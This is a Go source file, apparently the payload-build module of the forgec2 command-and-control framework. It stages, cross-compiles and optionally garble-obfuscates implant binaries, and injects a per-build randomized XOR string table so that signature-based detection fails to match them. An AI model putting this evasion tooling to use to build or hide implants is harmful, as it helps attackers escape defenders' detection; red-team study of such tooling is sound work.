package payload

import (
	"bytes"
	"context"
	"embed"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

func (c *ttlCache) get() string {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.ttl > 0 && time.Since(c.at) < c.ttl {
		return c.value
	}
	c.value = c.resolve()
	c.at = time.Now()
	return c.value
}

// SetConfiguredGoProxy records implant.goproxy from config.yaml. Applied to
// payload `go mod tidy` / `go build` only when the process GOPROXY env is
// unset, so an operator-exported GOPROXY always wins. Never hard-codes a mirror.
func SetConfiguredGoProxy(v string) {
	configuredGoProxyMu.Lock()
	configuredGoProxy = strings.TrimSpace(v)
	configuredGoProxyMu.Unlock()
}

func configuredGoProxyValue() string {
	configuredGoProxyMu.Lock()
	defer configuredGoProxyMu.Unlock()
	return configuredGoProxy
}

// goModuleEnv copies the process environment and injects GOPROXY from config
// when the env var is unset. extra entries replace inherited values with the
// same key instead of appending duplicate GOOS/GOARCH/CGO_ENABLED entries:
// duplicate keys make the child environment platform-dependent.
func goModuleEnv(extra ...string) []string {
	env := os.Environ()
	if strings.TrimSpace(os.Getenv("GOPROXY")) == "" {
		if p := configuredGoProxyValue(); p != "" {
			env = replaceOrAppendEnv(env, "GOPROXY", p)
		}
	}
	for _, entry := range extra {
		key, value, ok := strings.Cut(entry, "=")
		if !ok || key == "" {
			continue
		}
		env = replaceOrAppendEnv(env, key, value)
	}
	return env
}

// goToolchainEnv wraps goModuleEnv and pins GOTOOLCHAIN for legacy
// (Win7) builds so the stock toolchain auto-fetches go1.20.14 on first
// use. Non-legacy builds keep the host default untouched.
//
// Temporary agent modules are deliberately isolated from the operator's
// go.work and GOFLAGS: a workspace or vendor mode that applies to the server
// repository must not change how the throwaway agent module resolves.
func goToolchainEnv(win7 bool, extra ...string) []string {
	env := goModuleEnv(extra...)
	env = replaceOrAppendEnv(env, "GOWORK", "off")
	env = replaceOrAppendEnv(env, "GOFLAGS", "")
	if win7 {
		env = replaceOrAppendEnv(env, "GOTOOLCHAIN", win7Toolchain)
	}
	return env
}

func replaceOrAppendEnv(env []string, key, value string) []string {
	prefix := key + "="
	for i, e := range env {
		if strings.HasPrefix(e, prefix) {
			env[i] = prefix + value
			return env
		}
	}
	return append(env, prefix+value)
}

// getGoCmd returns the path to the Go executable via a short-TTL cache so that
// environment changes (PATH/GOROOT updates, a freshly installed toolchain) are
// picked up without a restart.
func getGoCmd() string {
	return goCmdCache.get()
}

// resolveGoCmd performs the actual lookup for getGoCmd.
// It first tries exec.LookPath, then common installation locations (especially useful
// on Windows when the server.exe is launched without a full user PATH, e.g. by double-click).
func resolveGoCmd() string {
	// Allow overriding via environment (advanced users / CI)
	if goBinary := os.Getenv("GO_BINARY"); goBinary != "" {
		if _, err := os.Stat(goBinary); err == nil {
			return goBinary
		}
		// env var points to non-existent file; clear override and fall through
	}

	// Standard PATH lookup
	if goPath, err := exec.LookPath("go"); err == nil {
		return goPath
	}

	// Windows-specific fallbacks (very common issue when running built .exe)
	if runtime.GOOS == "windows" {
		home := os.Getenv("USERPROFILE")
		candidates := []string{
			filepath.Join(home, "go", "bin", "go.exe"),
			`C:\Program Files\Go\bin\go.exe`,
			`C:\Program Files (x86)\Go\bin\go.exe`,
		}

		// Support the user's common sdk layout (e.g. C:\Users\xxx\sdk\go1.xx\bin\go.exe)
		if sdkDir := filepath.Join(home, "sdk"); true {
			if entries, err := os.ReadDir(sdkDir); err == nil {
				for _, e := range entries {
					if strings.HasPrefix(strings.ToLower(e.Name()), "go") {
						c := filepath.Join(sdkDir, e.Name(), "bin", "go.exe")
						candidates = append(candidates, c)
					}
				}
			}
		}

		if goroot := os.Getenv("GOROOT"); goroot != "" {
			candidates = append(candidates, filepath.Join(goroot, "bin", "go.exe"))
		}
		if gopath := os.Getenv("GOPATH"); gopath != "" {
			candidates = append(candidates, filepath.Join(gopath, "bin", "go.exe"))
		}

		for _, c := range candidates {
			if _, err := os.Stat(c); err == nil {
				return c
			}
		}
	}
	return ""
}

// getGarbleCmd locates the garble binary via a short-TTL cache. Same robustness
// as getGoCmd: garble is typically installed via `go install`, landing in
// GOPATH/bin, which is often missing from PATH when the server runs as a service.
func getGarbleCmd() string {
	return garbleCmdCache.get()
}

// resolveGarbleCmd performs the actual lookup for getGarbleCmd.
func resolveGarbleCmd() string {
	if p, err := exec.LookPath("garble"); err == nil {
		return p
	}
	var candidates []string
	if gopath := os.Getenv("GOPATH"); gopath != "" {
		candidates = append(candidates, filepath.Join(gopath, "bin", "garble.exe"), filepath.Join(gopath, "bin", "garble"))
	}
	if home, err := os.UserHomeDir(); err == nil {
		candidates = append(candidates,
			filepath.Join(home, "go", "bin", "garble.exe"),
			filepath.Join(home, "go", "bin", "garble"))
	}
	for _, c := range candidates {
		if info, err := os.Stat(c); err == nil && !info.IsDir() {
			return c
		}
	}
	return ""
}

// forgeC2ModuleRoot walks upward from the working directory to find the
// root go.mod (handles the server running from the project root AND go test
// runs, where the working directory is a subpackage).
func forgeC2ModuleRoot() (string, error) {
	wd, err := os.Getwd()
	if err != nil {
		wd = "."
	}
	dir := wd
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir, nil
		}
		parent := filepath.Dir(dir)
		if parent == dir || parent == "." || len(parent) <= len(filepath.VolumeName(parent)) {
			break
		}
		dir = parent
	}
	return "", fmt.Errorf("could not locate forgec2 module root from %s", wd)
}

// forgeC2ModuleReplace returns a `replace` directive for the local
// github.com/forgec2/forgec2 module, so the temp agent build can
// find it without requiring a remote git repository.
func forgeC2ModuleReplace() string {
	dir, err := forgeC2ModuleRoot()
	if err != nil {
		return ""
	}
	// go.mod replace targets must use forward slashes even on Windows.
	return "\nreplace github.com/forgec2/forgec2 => " + filepath.ToSlash(dir) + "\n"
}

// stageRootAgentModule seeds a temp agent module from the repository's own
// go.mod/go.sum. The root module already contains every dependency the agent
// imports, and its sum file is complete for the versions the server is tested
// with. Reusing it avoids a network-dependent `go mod tidy` on every build and,
// importantly, keeps the implant's dependency versions aligned with the
// server's security patches instead of the stale hard-coded pins in
// buildGoMod.
//
// Returns ok=false when the root module files are unavailable (for example a
// deployment that ships only the binary), in which case the caller falls back
// to the generated module plus `go mod tidy`.
func stageRootAgentModule(workDir string) (ok bool, err error) {
	root, err := forgeC2ModuleRoot()
	if err != nil {
		return false, nil
	}
	goMod, err := os.ReadFile(filepath.Join(root, "go.mod"))
	if err != nil {
		return false, nil
	}
	goSum, err := os.ReadFile(filepath.Join(root, "go.sum"))
	if err != nil || len(goSum) == 0 {
		return false, nil
	}
	staged := replaceModuleDirective(string(goMod), "agent")
	staged = strings.TrimRight(staged, "\r\n") + "\n\nreplace github.com/forgec2/forgec2 => " + filepath.ToSlash(root) + "\n"
	if err := os.WriteFile(filepath.Join(workDir, "go.mod"), []byte(staged), 0600); err != nil {
		return false, err
	}
	if err := os.WriteFile(filepath.Join(workDir, "go.sum"), goSum, 0600); err != nil {
		return false, err
	}
	return true, nil
}

// replaceModuleDirective rewrites only the module line, leaving the root
// module's require/replace/toolchain directives intact.
func replaceModuleDirective(mod, name string) string {
	lines := strings.Split(mod, "\n")
	for i, line := range lines {
		if strings.HasPrefix(strings.TrimSpace(line), "module ") {
			lines[i] = "module " + name
			break
		}
	}
	return strings.Join(lines, "\n")
}

// prepareAgentModule writes the temporary module files and resolves go.sum.
// Modern builds first try the root module (no tidy, no network); legacy Win7
// builds and deployments without module sources keep the generated go.mod and
// explicit tidy fallback.
func prepareAgentModule(goCmd, workDir, goos string, isDLL bool, plan agentBuildPlan, win7 bool) error {
	if win7 {
		if err := os.WriteFile(filepath.Join(workDir, "go.mod"), []byte(buildGoModWin7()), 0600); err != nil {
			return err
		}
		if err := materializeWin7Shim(workDir); err != nil {
			return err
		}
		return runGoModTidy(goCmd, workDir, true)
	}
	if ok, err := stageRootAgentModule(workDir); err != nil {
		return err
	} else if ok {
		return nil
	}
	goMod := buildGoMod(goos, isDLL, plan.TransportsExcluded, false, plan.includes("webrtc"))
	if err := os.WriteFile(filepath.Join(workDir, "go.mod"), []byte(goMod), 0600); err != nil {
		return err
	}
	return runGoModTidy(goCmd, workDir, false)
}

// runGoModTidy resolves go.sum entries for the temp build module. Every
// generate path must run this before `go build`; without it cross-builds
// fail with "missing go.sum entry" for OS-specific transitive imports.
func runGoModTidy(goCmd, workDir string, win7 bool) error {
	ctx, cancel := context.WithTimeout(context.Background(), buildTidyTimeout)
	defer cancel()
	tidyCmd := exec.CommandContext(ctx, goCmd, "mod", "tidy")
	tidyCmd.Dir = workDir
	tidyCmd.Env = goToolchainEnv(win7)
	var tidyOut, tidyErr bytes.Buffer
	tidyCmd.Stdout = &tidyOut
	tidyCmd.Stderr = &tidyErr
	if err := tidyCmd.Run(); err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return fmt.Errorf("go mod tidy timed out after %s (module proxy unreachable?). Set GOPROXY or implant.goproxy in config.yaml: %w", buildTidyTimeout, err)
		}
		return fmt.Errorf("go mod tidy failed: %w\n%s\n%s", err, tidyOut.String(), tidyErr.String())
	}
	return nil
}

// buildAgentBinary runs `go build` or `garble build` with consistent hardening flags.
// When obfuscate is requested, garble is REQUIRED: falling back to a plain
// build would silently produce an un-obfuscated implant (a false security
// promise), so a missing/broken garble fails the build instead.
func buildAgentBinary(goCmd, workDir, ldflags, outPath string, obfuscate bool, goos, goarch, configBlob, sConfigKey string, selfCheck, win7 bool) error {
	ctx, cancel := context.WithTimeout(context.Background(), buildCompileTimeout)
	defer cancel()
	if err := writeConfigInjectFile(workDir, configBlob, sConfigKey, selfCheck); err != nil {
		return fmt.Errorf("write config inject file: %w", err)
	}
	tags := wintunBuildTags(goos, goarch, workDir)
	if obfuscate {
		garblePath := getGarbleCmd()
		if garblePath == "" {
			return fmt.Errorf("obfuscation requested but garble is not installed: install it with `go install mvdan.cc/garble@latest`")
		}
		args := append([]string{"-literals", "-tiny", "-seed=random", "build", "-mod=mod"},
			"-ldflags", ldflags, "-o", outPath, "-trimpath", "-buildvcs=false")
		if len(tags) > 0 {
			args = append(args, "-tags", strings.Join(tags, ","))
		}
		args = append(args, ".")
		cmd := exec.CommandContext(ctx, garblePath, args...)
		cmd.Dir = workDir
		cmd.Env = goModuleEnv("GOOS="+goos, "GOARCH="+goarch, "CGO_ENABLED=0")
		var stderr bytes.Buffer
		cmd.Stderr = &stderr
		if err := cmd.Run(); err != nil {
			if ctx.Err() == context.DeadlineExceeded {
				return fmt.Errorf("garble build timed out after %s (goos=%s goarch=%s): %w", buildCompileTimeout, goos, goarch, err)
			}
			return fmt.Errorf("garble build failed (obfuscation=on, goos=%s, goarch=%s): %w\n%s\n(re-run without obfuscation or fix the garble install)", goos, goarch, err, scrubBuildLog(stderr.String(), ldflags))
		}
		return nil
	}
	buildArgs := []string{"build",
		"-mod=mod",
		"-ldflags", ldflags,
		"-o", outPath,
		"-trimpath",
		"-buildvcs=false",
	}
	if len(tags) > 0 {
		buildArgs = append(buildArgs, "-tags", strings.Join(tags, ","))
	}
	buildArgs = append(buildArgs, ".")
	cmd := exec.CommandContext(ctx, goCmd, buildArgs...)
	cmd.Dir = workDir
	cmd.Env = goToolchainEnv(win7, "GOOS="+goos, "GOARCH="+goarch, "CGO_ENABLED=0")
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return fmt.Errorf("go build timed out after %s (goos=%s, goarch=%s): %w", buildCompileTimeout, goos, goarch, err)
		}
		return fmt.Errorf("go build failed (goos=%s, goarch=%s, obfuscation=off): %w\n%s", goos, goarch, err, scrubBuildLog(stderr.String(), ldflags))
	}
	return nil
}

// scrubBuildLog redacts any injected ldflags secret values (the config blob and
// the per-build config key) from build-tooling output before it is returned in
// an error or persisted to a build log, so a failed build cannot leak the
// injected secrets into logs. It only redacts the exact secret token strings
// recovered from the ldflags; harmless output is left intact.
func scrubBuildLog(output, ldflags string) string {
	for _, key := range []string{"main.ConfigBlob", "main.SConfigKey"} {
		idx := strings.Index(ldflags, key+"=")
		if idx < 0 {
			continue
		}
		start := idx + len(key) + 1
		end := strings.IndexByte(ldflags[start:], '"')
		if end < 0 {
			continue
		}
		secret := ldflags[start : start+end]
		if secret != "" {
			output = strings.ReplaceAll(output, secret, "[redacted]")
		}
	}
	return output
}

// extractAgentSources writes the Go agent source files (plus any non-Go
// assets, currently the optional Wintun runtimes) from the embedded FS into
// the temp build directory. This enables cross-platform builds
// (windows/linux/darwin) and is where the operator's agent module selection
// takes effect: excluded modules lose their registry files (their command
// entry points) and any exclusively-owned implementation files, the
// hand-build modules_default.go is replaced by the generated
// modules_excluded.go, and — for the transports_advanced slice — the
// grpc/quic/wss transports are replaced by stubs and transport_utls.go loses
// its grpc-only tail, cutting ~30% off the binary.
func extractAgentSources(efs embed.FS, dir string, plan agentBuildPlan) error {
	entries, err := efs.ReadDir("agent")
	if err != nil {
		return fmt.Errorf("failed to read embedded agent dir: %w", err)
	}
	dropped := plan.droppedAgentFiles()
	hasAgentGo := false
	for _, entry := range entries {
		if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".go") {
			continue
		}
		name := entry.Name()
		// Hand builds get modules_default.go from the repo; staged trees get
		// modules_excluded.go written below.
		if name == "modules_default.go" {
			continue
		}
		if dropped[name] {
			continue
		}
		// Platform-specific sources use go:build tags; include all .go files so links resolve.
		if name == "agent.go" {
			hasAgentGo = true
		}
		data, err := efs.ReadFile("agent/" + name)
		if err != nil {
			return fmt.Errorf("failed to read embedded agent/%s: %w", name, err)
		}
		if plan.TransportsExcluded && name == "transport_utls.go" {
			if data, err = stripUTLSCreds(data); err != nil {
				return err
			}
		}
		// 0600: the staged build tree embeds the agent source the operator is
		// about to compile; keep it owner-only like the resulting binary.
		if err := os.WriteFile(filepath.Join(dir, name), data, 0600); err != nil {
			return err
		}
	}
	if !hasAgentGo {
		return fmt.Errorf("embedded agent directory missing agent.go")
	}
	// Non-Go agent assets (the optional Wintun runtimes) are copied verbatim
	// so tagged windows builds can embed the DLL for their target arch.
	if err := extractAgentAssets(efs, dir); err != nil {
		return err
	}
	if plan.TransportsExcluded {
		if err := os.WriteFile(filepath.Join(dir, "transport_slim_stubs.go"), []byte(slimTransportStubs), 0600); err != nil {
			return err
		}
	}
	if err := os.WriteFile(filepath.Join(dir, "modules_excluded.go"), []byte(plan.moduleExcludedSource()), 0600); err != nil {
		return err
	}

	// Every agent build gets a freshly randomized string table (fresh XOR keys
	// per constant, plaintext comments stripped) so binaries are not
	// fingerprinter-friendly against a static table.
	if err := injectRandomizedStrxor(dir); err != nil {
		return err
	}
	return nil
}

// injectRandomizedStrxor regenerates agent/strxor.go inside the build dir with
// brand-new obfuscation values for this specific build.
func injectRandomizedStrxor(buildDir string) error {
	table, err := randomizeStrxor()
	if err != nil {
		return err
	}
	return os.WriteFile(filepath.Join(buildDir, "strxor.go"), table, 0600)
}
